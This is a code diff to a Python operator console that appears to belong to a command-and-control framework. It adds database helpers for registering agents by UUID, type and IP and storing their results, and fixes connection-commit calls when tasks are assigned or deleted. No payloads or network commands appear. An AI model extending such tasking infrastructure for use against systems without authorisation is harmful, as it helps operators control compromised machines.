@@ -56,6 +56,10 @@ def init_db(conn,cursor):
     ''')
     conn.commit()
 
+
+def connect_db():
+    return sqlite3.connect('c2.db', timeout=10)
+
 # possible actions for database lock issue
 # https://gist.github.com/rianhunter/10bfcff17c18d112de16
 # https://stackoverflow.com/questions/2740806/python-sqlite-database-is-locked
@@ -72,6 +76,14 @@ class CLI(cmd.Cmd):
         super().__init__()
         self.conn = conn
         self.cursor = cursor
+
+    def add_agent(self, uuid_str, type, ip):
+            self.cursor.execute("INSERT INTO hosts (uuid, type, ip) VALUES (?,?,?)", (uuid_str, type, ip))
+            self.conn.commit()
+
+    def add_result(self, agent_name, result):
+            self.cursor.execute("INSERT OR REPLACE INTO results (uuid, result) VALUES (?,?)", (agent_name, result))
+            self.conn.commit()
 
     def add_task(self, uuid_str, task):
         self.cursor.execute('SELECT uuid FROM tasks WHERE uuid=?', (uuid_str,))    
@@ -109,7 +121,7 @@ class CLI(cmd.Cmd):
                 for u in uuids:
                     self.add_task(u, task)
                     
-                conn.commit()
+                self.conn.commit()
                 #print("OK!")
                 
             elif "type" in uuid_str:
@@ -119,14 +131,14 @@ class CLI(cmd.Cmd):
                     uuids = [r[0] for r in self.cursor.fetchall()]
                     for u in uuids:
                         self.add_task(u, task)
-                    conn.commit()
+                    self.conn.commit()
                     #print("OK!")
                 else:
                     self.do_help("task")                
             else:
                 # specific uuid
                 self.add_task(uuid_str, task)
-                conn.commit()   
+                self.conn.commit()   
                 #print("OK!")
             
         elif args[0] == "delete":
@@ -134,7 +146,7 @@ class CLI(cmd.Cmd):
                 uuid_str = args[1]
                 if uuid_str == 'all':
                     recreate_tasks_table(self.conn, self.cursor)
-                    print("OK!")
+                    #print("OK!")
 
                 elif "type" in uuid_str:
                     uuid_str = uuid_str.split('=')
@@ -143,15 +155,15 @@ class CLI(cmd.Cmd):
                         uuids = [r[0] for r in self.cursor.fetchall()]
                         for u in uuids:
                             self.del_task(u)
-                        conn.commit()
-                        print("OK!")
+                        self.conn.commit()
+                        #print("OK!")
                     else:
                         self.do_help("task")   
                     
                 else:
                     self.del_task(uuid_str)                    
 
-                conn.commit()
+                self.conn.commit()
                 print("OK!")
             else:
                 self.do_help("task delete")
@@ -343,7 +355,7 @@ class CLI(cmd.Cmd):
               )
 
 if __name__ == '__main__':
-    conn = None
+    #conn = None
 
     try:
     
